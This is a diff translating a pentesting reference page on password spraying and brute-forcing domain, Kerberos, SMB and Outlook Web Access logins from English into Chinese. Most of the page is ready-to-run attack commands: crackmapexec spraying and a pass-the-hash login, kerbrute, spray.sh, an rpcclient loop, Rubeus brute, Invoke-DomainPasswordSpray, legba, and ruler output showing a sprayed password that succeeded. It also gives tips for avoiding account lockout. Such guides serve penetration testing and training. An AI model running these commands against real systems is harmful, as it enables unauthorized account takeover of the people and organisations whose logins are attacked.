@@ -1,26 +1,25 @@
-# Password Spraying / Brute Force
+# 密码喷洒 / 暴力破解
 
 {{#include ../../banners/hacktricks-training.md}}
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+通过8kSec Academy深化您在**移动安全**方面的专业知识。通过我们的自学课程掌握iOS和Android安全并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
-## **Password Spraying**
+## **密码喷洒**
 
-Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
-By **default** the **minimum** **password** **length** is **7**.
+一旦您找到了几个**有效的用户名**，您可以尝试每个发现的用户的最**常见密码**（请记住环境的密码策略）。\
+默认情况下，**最小** **密码** **长度**为**7**。
 
-Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+常见用户名的列表也可能有用：[https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).
+请注意，如果您尝试多个错误密码，您**可能会锁定某些账户**（默认情况下超过10次）。
 
-### Get password policy
+### 获取密码策略
 
-If you have some user credentials or a shell as a domain user you can **get the password policy with**:
-
+如果您拥有一些用户凭据或作为域用户的shell，您可以**获取密码策略**：
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -37,57 +36,45 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
+### 从Linux（或所有）进行利用
 
-### Exploitation from Linux (or all)
-
-- Using **crackmapexec:**
-
+- 使用 **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-
-- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
-
+- 使用 [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-
-- [**spray**](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_
-
+- [**spray**](https://github.com/Greenwolf/Spray) _**(您可以指示尝试次数以避免锁定):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-
-- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK
-
+- 使用 [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - 不推荐，有时无法正常工作
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-
-- With the `scanner/smb/smb_login` module of **Metasploit**:
+- 使用 **Metasploit** 的 `scanner/smb/smb_login` 模块：
 
 ![](<../../images/image (745).png>)
 
-- Using **rpcclient**:
-
+- 使用 **rpcclient**：
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
-    rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
+rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
+#### 从Windows
 
-#### From Windows
-
-- With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
-
+- 使用带有暴力模块的[Rubeus](https://github.com/Zer1t0/Rubeus)版本：
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -95,46 +82,37 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-
-- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (It can generate users from the domain by default and it will get the password policy from the domain and limit tries according to it):
-
+- 使用 [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)（它可以默认从域生成用户，并将从域获取密码策略，并根据该策略限制尝试次数）：
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-
-- With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
-
+- 使用 [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 ```
 Invoke-SprayEmptyPassword
 ```
-
-## Brute Force
-
+## 暴力破解
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-
 ## Outlook Web Access
 
-There are multiples tools for p**assword spraying outlook**.
+有多种工具可以进行**密码喷洒 Outlook**。
 
-- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
-- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+- 使用 [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
+- 使用 [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- 使用 [Ruler](https://github.com/sensepost/ruler)（可靠！）
+- 使用 [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)（Powershell）
+- 使用 [MailSniper](https://github.com/dafthack/MailSniper)（Powershell）
 
-To use any of these tools, you need a user list and a password / a small list of passwords to spray.
-
+要使用这些工具中的任何一个，您需要一个用户列表和一个密码/一小部分密码列表进行喷洒。
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
-    [x] Failed: larsson:Summer2020
-    [x] Failed: cube0x0:Summer2020
-    [x] Failed: a.admin:Summer2020
-    [x] Failed: c.cube:Summer2020
-    [+] Success: s.svensson:Summer2020
+[x] Failed: larsson:Summer2020
+[x] Failed: cube0x0:Summer2020
+[x] Failed: a.admin:Summer2020
+[x] Failed: c.cube:Summer2020
+[+] Success: s.svensson:Summer2020
 ```
-
 ## Google
 
 - [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
@@ -154,9 +132,8 @@ To use any of these tools, you need a user list and a password / a small list of
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+深入了解 **移动安全**，加入 8kSec 学院。通过我们的自学课程掌握 iOS 和 Android 安全，并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
